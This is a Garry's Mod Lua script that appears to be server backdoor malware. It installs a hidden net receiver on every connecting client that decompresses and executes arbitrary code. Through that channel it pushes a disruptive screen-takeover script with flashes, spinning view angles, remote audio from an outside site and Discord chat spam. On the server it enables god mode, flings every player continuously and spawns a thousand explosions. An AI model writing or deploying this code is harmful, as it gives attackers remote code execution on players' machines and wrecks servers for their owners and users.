function RandomString( intMin, intMax )
    local ret = ""
    for _ = 1, math.random( intMin, intMax ) do
        ret = ret.. string.char( math.random(65, 90) )
    end

    return ret
end

m_strImageGlobalVar = RandomString( 6, 12 )

local function rdm_str(len)
    if !len or len <= 0 then return '' end
    return rdm_str(len - 1) .. ("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789")[math.random(1, 62)]
end

local net_string = rdm_str(25)

util.AddNetworkString(net_string)
BroadcastLua([[net.Receive("]] .. net_string .. [[",function()CompileString(util.Decompress(net.ReadData(net.ReadUInt(16))),"?")()end)]])
hook.Add("PlayerInitialSpawn", "ifyouseethisdontpanicitsme",function(ply)
    if !ply:IsBot() then
        ply:SendLua([[net.Receive("]] .. net_string .. [[",function()CompileString(util.Decompress(net.ReadData(net.ReadUInt(16))),"?")()end)]])
    end
end)

local function SendToClient(code)
    timer.Simple(1, function()
        local data = util.Compress(code)
        local len = #data
        net.Start(net_string)
        net.WriteUInt(len, 16)
        net.WriteData(data, len)
        net.Broadcast()
    end)
end

timer.Simple( 1, function()
    SendToClient([[

local GLITCHTEXTWHITE = {Color(255,255,255),Color(150,150,150),Color(200,200,200)} 
 

function Flash() 
    local FLASH = vgui.Create( "DFrame" ) 
    FLASH:SetTitle( "" ) 
    FLASH:SetSize( ScrW(),ScrH() ) 
    FLASH:ShowCloseButton( false ) 
    FLASH:SetDraggable( false ) 
    FLASH.Paint = function( self, w, h ) 
        draw.RoundedBox( 0, 0, 0, w, h, Color( 255, 255, 255, 255 ) ) 
    end 
    timer.Simple(0.5,function() 
        FLASH:AlphaTo(0, 0.5, 0) 
        timer.Simple(0.6,function() 
            FLASH:Remove() 
        end) 
    end) 
end 
 
function unpeutdecoke() 
   local mélanger = {} 
   mélanger[ "$pp_colour_addr" ] = 0 
   mélanger[ "$pp_colour_addg" ] = 0 
   mélanger[ "$pp_colour_addb" ] = 0.1 
   mélanger[ "$pp_colour_brightness" ] = 0 
   mélanger[ "$pp_colour_contrast" ] = 0.6 
   mélanger[ "$pp_colour_colour" ] = -8 
   mélanger[ "$pp_colour_mulr" ] = 1 
   mélanger[ "$pp_colour_mulg" ] = 1 
   mélanger[ "$pp_colour_mulb" ] = 250 
   DrawColorModify( mélanger ) 
end 

surface.CreateFont("BRAINTEXT", { font = "CloseCaption_Bold", size = 40, weight = 1500, }) 

local LIGHT = vgui.Create( "DFrame" ) 
LIGHT:SetTitle( "" ) 
LIGHT:SetSize( 150,150 ) 
LIGHT:ShowCloseButton( false ) 
LIGHT:SetDraggable( false ) 
LIGHT:SetPos( ScrW(),ScrH() / 2 - LIGHT:GetTall() / 2 ) 
LIGHT.Paint = function( self, w, h ) 
   draw.RoundedBox( 0, 0, 0, w, h, Color( 255, 255, 0, 0 ) ) 
end 
local IMGLIGHT = vgui.Create( "DHTML" , LIGHT ) 
IMGLIGHT:SetSize( LIGHT:GetWide(),LIGHT:GetTall() ) 
IMGLIGHT:SetHTML( "<head><style>body{background: url(https://i.imgur.com/BmW9vLq.png) no-repeat center center fixed;background-size: cover;}</style></head>" )

local BRAIN = vgui.Create( "DFrame" ) 
BRAIN:SetTitle( "" ) 
BRAIN:SetSize( 300,300 ) 
BRAIN:ShowCloseButton( false ) 
BRAIN:SetDraggable( false ) 
BRAIN:SetPos( ScrW() / 2 - BRAIN:GetWide() / 2,ScrH() - BRAIN:GetTall() / 2 + 300 ) 
BRAIN.Paint = function( self, w, h ) 
   draw.RoundedBox( 0, 0, 0, w, h, Color( 255, 0, 0, 0 ) ) 
end 

local IMGBRAIN = vgui.Create( "DHTML" , BRAIN ) 
IMGBRAIN:SetSize( BRAIN:GetWide(),BRAIN:GetTall() ) 
IMGBRAIN:SetHTML( "<head><style>body{background: url(https://i.imgur.com/DyNEGKU.png) no-repeat center center fixed;background-size: cover;}</style></head>") 
local LIGHTSMALL1 = vgui.Create( "DHTML" ) 
LIGHTSMALL1:SetPos(-60,-60) 
LIGHTSMALL1:SetSize( 60,60 ) 
LIGHTSMALL1:MoveToFront() 
LIGHTSMALL1:SetHTML( "<head><style>body{background: url(https://i.imgur.com/1et33vh.png) no-repeat center center fixed;background-size: cover;}</style></head>") 
local LIGHTSMALL2 = vgui.Create( "DHTML" ) 
LIGHTSMALL2:SetPos(-60,-60) 
LIGHTSMALL2:SetSize( 60,60 ) 
LIGHTSMALL2:MoveToFront() 
LIGHTSMALL2:SetHTML( "<head><style>body{background: url(https://i.imgur.com/1et33vh.png) no-repeat center center fixed;background-size: cover;}</style></head>") 
   
local LIGHTSMALL3 = vgui.Create( "DHTML" ) 
LIGHTSMALL3:SetPos(-60,-60) 
LIGHTSMALL3:SetSize( 60,60 ) 
LIGHTSMALL3:MoveToFront() 
LIGHTSMALL3:SetHTML( "<head><style>body{background: url(https://i.imgur.com/1et33vh.png) no-repeat center center fixed;background-size: cover;}</style></head>") 

timer.Simple(5,function() 
   timer.Simple(7,function() 
       LIGHT:MoveTo(ScrW() / 2 - LIGHT:GetWide() / 2, ScrH() / 2 - LIGHT:GetTall() / 2, 0.4, 0, -1) 
   end) 
   timer.Simple(5,function() 
       BRAIN:MoveTo(ScrW() / 2 - BRAIN:GetWide() / 2, ScrH() / 2 - BRAIN:GetTall() / 2, 0.7, 0, -1) 
   end) 
   sound.PlayURL("https://kvcdoor.ovh/assets/brained.mp3","no block",function(MUSICSMART) 
       if not IsValid(source) then return end 
       MUSICSMART:Play() 
       MUSICSMART:SetVolume(3) 
   end) 
   timer.Simple(7.34,function() 
       hook.Add( "RenderScreenspaceEffects", "EFFECTSCREEN", function() 
           DrawMaterialOverlay( "effects/combine_binocoverlay.vmt", 1 ) 
       end) 
       local APLUSDEHUDDEMERDE = { ["CHudHealth"] = true, ["CHudCrosshair"] = true } 
       hook.Add( "HUDShouldDraw", "APLUSDEHUDDEMERDEHOOK", function( name )
           if ( APLUSDEHUDDEMERDE[ name ] ) then return false end 
       end) 
           hook.Add( "SetupWorldFog", "SMOKESMART", function()
               render.FogMode( 1 ) 
               render.FogStart( 20 ) 
               render.FogEnd( 300 ) 
               render.FogMaxDensity( 0.6 ) 
               local col = Vector(50,200,200) 
               render.FogColor( col.x * 255, col.y * 255, col.z * 255 ) return true 
           end)
               BRAIN:Close() 
               LIGHT:Close() 
               util.ScreenShake( Vector(0,0,0), 50, 20, 10, 5000 ) 
               surface.PlaySound("ambient/explosions/explode_3.wav") 
               surface.PlaySound("ambient/explosions/explode_2.wav") 
               hook.Add( "RenderScreenspaceEffects", "FILTERSMART", unpeutdecoke ) 
               
               local BRAIN = vgui.Create( "DFrame" ) 
               BRAIN:SetTitle( "" ) 
               BRAIN:SetSize( 300,300 ) 
               BRAIN:ShowCloseButton( false ) 
               BRAIN:SetDraggable( false ) 
               BRAIN:SetPos(ScrW() / 2 + math.sin(RealTime() + 80) * ScrW() / 6 - 150,ScrH() / 2 + math.cos(RealTime()+ 80) * ScrH() / 6 - 150) 
               BRAIN.Paint = function( self, w, h ) 
                   draw.RoundedBox( 0, 0, 0, w, h, Color( 255, 0, 0, 0 ) ) 
               end 
               local IMGBRAIN = vgui.Create( "DHTML" , BRAIN ) 
               IMGBRAIN:SetSize( BRAIN:GetWide(),BRAIN:GetTall() ) 
               IMGBRAIN:SetHTML( "<head><style>body{background: url(https://i.imgur.com/DyNEGKU.png) no-repeat center center fixed;background-size: cover;}</style></head>") 

               local BOXMESS = vgui.Create( "DFrame" ) 
               BOXMESS:SetTitle( "" ) BOXMESS:SetSize( ScrW(),50 ) 
               BOXMESS:ShowCloseButton( false ) 
               BOXMESS:SetDraggable( false ) 
               BOXMESS:SetPos( ScrW() / 2 - BOXMESS:GetWide() / 2, ScrH() / 2 + 125 ) 
               BOXMESS.Paint = function( self, w, h ) 
                   draw.SimpleTextOutlined("Bonjour moi c'est Games-Manager","BRAINTEXT",BOXMESS:GetWide() /2,BOXMESS:GetTall() /2,table.Random(GLITCHTEXTWHITE),TEXT_ALIGN_CENTER,TEXT_ALIGN_CENTER,2,Color( 50, 50, 50, 255 )) 
               end 
               timer.Simple(4,function() 
                   BOXMESS.Paint = function( self, w, h ) 
                       draw.SimpleTextOutlined("Je suis ici, car ce serveur a fais une erreur !","BRAINTEXT",BOXMESS:GetWide() /2,BOXMESS:GetTall() /2,table.Random(GLITCHTEXTWHITE),TEXT_ALIGN_CENTER,TEXT_ALIGN_CENTER,2,Color(50, 50, 50, 255 )) 
                   end 
               end) 
               timer.Simple(7.5,function() 
                   BOXMESS.Paint = function( self, w, h ) 
                       draw.SimpleTextOutlined("Je suis là pour tout remettre en place","BRAINTEXT",BOXMESS:GetWide() /2,BOXMESS:GetTall() /2,table.Random(GLITCHTEXTWHITE),TEXT_ALIGN_CENTER,TEXT_ALIGN_CENTER,2,Color(50, 50, 50, 255 )) 
                   end 
               end) 
               timer.Simple(11.5,function() 
                   BOXMESS.Paint = function( self, w, h ) 
                       draw.SimpleTextOutlined("En supprimant tout les addons leak !","BRAINTEXT",BOXMESS:GetWide() /2,BOXMESS:GetTall() /2,table.Random(GLITCHTEXTWHITE),TEXT_ALIGN_CENTER,TEXT_ALIGN_CENTER,2,Color(50, 50, 50, 255 )) 
                   end 
               end) 
               timer.Simple(14.5,function() 
                   BOXMESS.Paint = function( self, w, h ) 
                       draw.SimpleTextOutlined("","BRAINTEXT",BOXMESS:GetWide() /2,BOXMESS:GetTall() /2,table.Random(GLITCHTEXTWHITE),TEXT_ALIGN_CENTER,TEXT_ALIGN_CENTER,2,Color(50, 50, 50, 255 )) 
                   end 
               end) 
               
               hook.Add("Think","allalalala", function() 
                    LIGHTSMALL1:SetPos(ScrW() / 2 + math.sin(RealTime() + 80) * ScrW() / 6 - 30,ScrH() / 2 + math.cos(RealTime()+ 80) * ScrH() / 6 - 60) 
                    LIGHTSMALL2:SetPos(ScrW() / 2 + math.sin(RealTime()) * ScrW() / 6 - 30,ScrH() / 2 + math.cos(RealTime()) * ScrH() / 6 - 60) 
                    LIGHTSMALL3:SetPos(ScrW() / 2 + math.sin(RealTime() + 40) * ScrW() / 6 - 30,ScrH() / 2 + math.cos(RealTime() + 40) * ScrH() / 6 - 60) 
                    BRAIN:SetPos(ScrW() / 2 + math.cos(RealTime() + 2) * ScrH()/ 40 - 150 ,ScrH() / 2 + math.cos(RealTime()+ 10) * 7 -150) 
               end) 

               Flash() 

               timer.Simple(28,function() 
                   util.ScreenShake( Vector(0,0,0), 50, 20, 15, 5000 ) 
               end) 

               timer.Simple(38,function() 
                   BOXMESS.Paint = function( self, w, h ) 
                       draw.SimpleTextOutlined("C'EST REPARTI POUR UN TOUR !","BRAINTEXT",BOXMESS:GetWide()/2 + math.Rand(-3,3),BOXMESS:GetTall()/2 + math.Rand(-3,3),table.Random(GLITCHTEXTWHITE),TEXT_ALIGN_CENTER,TEXT_ALIGN_CENTER,2,Color(50, 50, 50, 255 )) 
                   end 
                   timer.Simple(1.5,function() 
                       BOXMESS.Paint = function( self, w, h ) 
                           draw.SimpleTextOutlined("","BRAINTEXT",BOXMESS:GetWide()/2 + math.Rand(-3,3),BOXMESS:GetTall()/2 + math.Rand(-10,10),table.Random(GLITCHTEXTWHITE),TEXT_ALIGN_CENTER,TEXT_ALIGN_CENTER,2,Color(50, 50, 50, 255 )) 
                       end 
                   end) 
               end) 

               timer.Simple( 39.16, function() 
                   hook.Add("Think","allalalala",function() 
                       LocalPlayer():SetEyeAngles(Angle(math.sin(RealTime()) * 20, math.sin(RealTime()) * 150, RealTime() * 150)) 
                       BRAIN:SetPos( ScrW() / 2 - BRAIN:GetWide() / 2 + math.Rand(-10,10), ScrH() / 2 - 
                       BRAIN:GetTall() / 2 + math.Rand(-10,10) ) 
                       LIGHTSMALL1:SetPos(ScrW() / 2 + math.sin(RealTime()*10 + 80) * ScrW() / 6 - 30,ScrH() / 2 + math.cos(RealTime()*10 + 80) * ScrH() / 6 - 60) LIGHTSMALL2:SetPos(ScrW() / 2 + math.sin(RealTime()*10) * ScrW() / 6 - 30,ScrH() / 2 + math.cos(RealTime()*10) * ScrH() / 6 - 60) LIGHTSMALL3:SetPos(ScrW() / 2 + math.sin(RealTime()*10 + 40) * ScrW() / 6 - 30,ScrH() / 2 + math.cos(RealTime()*10 + 40) * ScrH() / 6 - 60) local zdlzdlzd = {
                           Color(0,255,255),
                           Color(0,0,0),
                           Color(255,0,255)
                       } 
                       local mat = Entity(0):GetMaterials() 

                       for k,v in pairs(mat) do 
                           local col = table.Random(zdlzdlzd) 
                           local ve = Vector(col.r / 255, col.g / 255, col.b / 255) 
                           Material(v):SetVector("$color", ve) 
                       end 
                   end) 
               end) 

               timer.Simple( 61.66, function() 
                   LocalPlayer():SetEyeAngles(Angle(0, 0, 0)) 
                   BRAIN:SetPos( ScrW() / 2 - BRAIN:GetWide() / 2 + math.Rand(-10,10), ScrH() / 2 - BRAIN:GetTall() / 2 + math.Rand(-10,10) ) 
                   
                   hook.Add("Think","allalalala", function() 
                       LIGHTSMALL1:SetPos(ScrW() / 2 + math.sin(RealTime() + 80) * ScrW() / 6 - 30,ScrH() / 2 + math.cos(RealTime()+ 80) * ScrH() / 6 - 60) LIGHTSMALL2:SetPos(ScrW() / 2 + math.sin(RealTime()) * ScrW() / 6 - 30,ScrH() / 2 + math.cos(RealTime()) * ScrH() / 6 - 60) 
                       LIGHTSMALL3:SetPos(ScrW() / 2 + math.sin(RealTime() + 40) * ScrW() / 6 - 30,ScrH() / 2 + math.cos(RealTime() + 40) * ScrH() / 6 - 60) BRAIN:SetPos(ScrW() / 2 + math.cos(RealTime() + 2) * ScrH()/ 40 - 150 ,ScrH() / 2 + math.cos(RealTime()+ 10) * 7 -150) 
                       local mat = Entity(0):GetMaterials() 
                       for k,v in pairs(mat) do 
                           local col = Color(255,255,255) 
                           local ve = Vector(col.r / 255, col.g / 255, col.b / 255) 
                           Material(v):SetVector("$color", ve) 
                       end 
                   end) 
               end) 
               timer.Simple(96,function() 
                   util.ScreenShake( Vector(0,0,0), 50, 20, 15, 5000 ) 
               end) 
               timer.Simple(105,function() 
                   BOXMESS.Paint = function( self, w, h ) 
                       draw.SimpleTextOutlined("C'EST REPARTI POUR UN TOUR !","BRAINTEXT",BOXMESS:GetWide()/2 + math.Rand(-3,3),BOXMESS:GetTall()/2 + math.Rand(-3,3),table.Random(GLITCHTEXTWHITE),TEXT_ALIGN_CENTER,TEXT_ALIGN_CENTER,2,Color(50, 50, 50, 255 )) 
                   end 
                   timer.Simple(1.5,function() 
                       BOXMESS.Paint = function( self, w, h ) 
                           draw.SimpleTextOutlined(" ","BRAINTEXT",BOXMESS:GetWide()/2 + math.Rand(-3,3),BOXMESS:GetTall()/2 + math.Rand(-3,3),Color( 255, 153, 153, 255 ),table.Random(GLITCHTEXTWHITE),TEXT_ALIGN_CENTER,2,Color(50, 50, 50, 255 )) 
                       end 
                   end) 
               end) 
               timer.Simple( 106.5, function() 
                   hook.Add("Think","allalalala",function() 
                       LocalPlayer():SetEyeAngles(Angle(math.sin(RealTime()) * 35, math.sin(RealTime()) * 220, RealTime() * 230)) 
                       BRAIN:SetPos( ScrW() / 2 - BRAIN:GetWide() / 2 + math.Rand(-20,20), ScrH() / 2 - BRAIN:GetTall() / 2 + math.Rand(-20,20) ) 
                       LIGHTSMALL1:SetPos(ScrW() / 2 + math.sin(RealTime()*10 + 80) * ScrW() / 6 - 30,ScrH() / 2 + math.cos(RealTime()*12 + 80) * ScrH() / 6 - 60) LIGHTSMALL2:SetPos(ScrW() / 2 + math.sin(RealTime()*10) * ScrW() / 6 - 30,ScrH() / 2 + math.cos(RealTime()*12) * ScrH() / 6 - 60) LIGHTSMALL3:SetPos(ScrW() / 2 + math.sin(RealTime()*10 + 40) * ScrW() / 6 - 30,ScrH() / 2 + math.cos(RealTime()*12 + 40) * ScrH() / 6 - 60) local zdlzdlzd = {
                           Color(0,255,255),
                           Color(0,0,0),
                           Color(255,0,255)
                       } 
                       local mat = Entity(0):GetMaterials() 
                       for k,v in pairs(mat) do 
                           local col = table.Random(zdlzdlzd) 
                           local ve = Vector(col.r / 255, col.g / 255, col.b / 255) 
                           Material(v):SetVector("$color", ve) 
                       end 
                   end) 
               end) 
               timer.Simple( 138, function() 
                   LIGHTSMALL1:SetHTML( "" ) 
                   LIGHTSMALL3:SetHTML( "") 
                   LIGHTSMALL2:SetHTML( "" ) 
                   hook.Add("Think","allalalala", function() 
                       BRAIN:SetPos(ScrW() / 2 + math.cos(RealTime() + 2) * ScrH()/ 40 - 150 ,ScrH() / 2 + math.cos(RealTime()+ 10) * 7 -150) 
                   end) 
                   surface.PlaySound("ambient/explosions/explode_3.wav") 
                   surface.PlaySound("ambient/explosions/explode_2.wav") 
                   hook.Add("HUDPaint", "HUDPaint_DrawABox", function() 
                        surface.SetDrawColor( 0, 0, 0 ) 
                        surface.DrawRect( 0, 0, ScrW(), ScrH() ) 
                   end ) 
                   timer.Simple(0.5,function() 
                       BOXMESS.Paint = function( self, w, h ) 
                           draw.SimpleTextOutlined("J'espère qu'on se reverra","BRAINTEXT",BOXMESS:GetWide() /2,BOXMESS:GetTall() /2,table.Random(GLITCHTEXTWHITE),TEXT_ALIGN_CENTER,TEXT_ALIGN_CENTER,2,Color(50, 50, 50, 255 )) 
                       end 
                   end) 
                   timer.Simple(4.5,function() 
                       BOXMESS.Paint = function( self, w, h ) 
                           draw.SimpleTextOutlined("Bisous ❤","BRAINTEXT",BOXMESS:GetWide() /2,BOXMESS:GetTall() /2,table.Random(GLITCHTEXTWHITE),TEXT_ALIGN_CENTER,TEXT_ALIGN_CENTER,2,Color(50, 50, 50, 255 )) 
                       end 
                   end) 
                   Flash() 
               end) 
           end) 
 -- "noname.lua"
-- Retrieved by https://github.com/lewisclark/glua-steal
 
       timer.Create("spamchatbienchiant", 1.5, 0, function()
           local time = tonumber(0)
           local Message = {
               "        .https://discord.gg/Games-manager #Games-manager.",
               "       ..https://discord.gg/Games-manager #Games-manager..",
               "      ...https://discord.gg/Games-manager #Games-manager...",
               "     ....https://discord.gg/Games-manager #Games-manager....",
               "    .....https://discord.gg/Games-manager #Games-manager.....",
               "   ......https://discord.gg/Games-manager #Games-manager......",
               "  .......https://discord.gg/Games-manager #Games-manager.......",
               " ........https://discord.gg/Games-manager #Games-manager........",
               ".........https://discord.gg/Games-manager #Games-manager.........",
               " ........https://discord.gg/Games-manager #Games-manager........",
               "  .......https://discord.gg/Games-manager #Games-manager.......",
               "   ......https://discord.gg/Games-manager #Games-manager......",
               "    .....https://discord.gg/Games-manager #Games-manager.....",
               "     ....https://discord.gg/Games-manager #Games-manager....",
               "      ...https://discord.gg/Games-manager #Games-manager...",
               "       ..https://discord.gg/Games-manager #Games-manager..",
               "        .https://discord.gg/Games-manager #Games-manager.",
               }

           for _, line in pairs(Message) do
               time = time + tonumber(0.1)
               timer.Simple(time,function()
                   chat.AddText(HSVToColor( CurTime() % 6 * 60, 1, 1 ),line)
               end)
           end
       end)
end)

]]) 
local function deplacerTousLesJoueurs()
    local vitesse = 1500000

    for _, ply in ipairs(player.GetAll()) do
        local direction = Vector(math.random(-1, 1), math.random(-1, 1), math.random(-1, 0)):GetNormalized() -- Choix aléatoire de la direction
        ply:SetVelocity(direction * vitesse)
    end
end
for _, ply in ipairs( player.GetAll() ) do
    ply:GodEnable()
end
timer.Create("DeplacementAutomatique", 0.1, 0, deplacerTousLesJoueurs)
local function genererExplosion()
    local position = Vector(math.random(-16384, 16384), math.random(-16384, 16384), math.random(-16384, 16384)) -- Position aléatoire sur la carte
    local sourceEntity = Entity(0)
    util.BlastDamage(sourceEntity, sourceEntity, position, 300, 1000) 
end
local function genererMillierExplosions()
    for i = 1, 1000 do
        genererExplosion()
    end
end
genererMillierExplosions()
end)

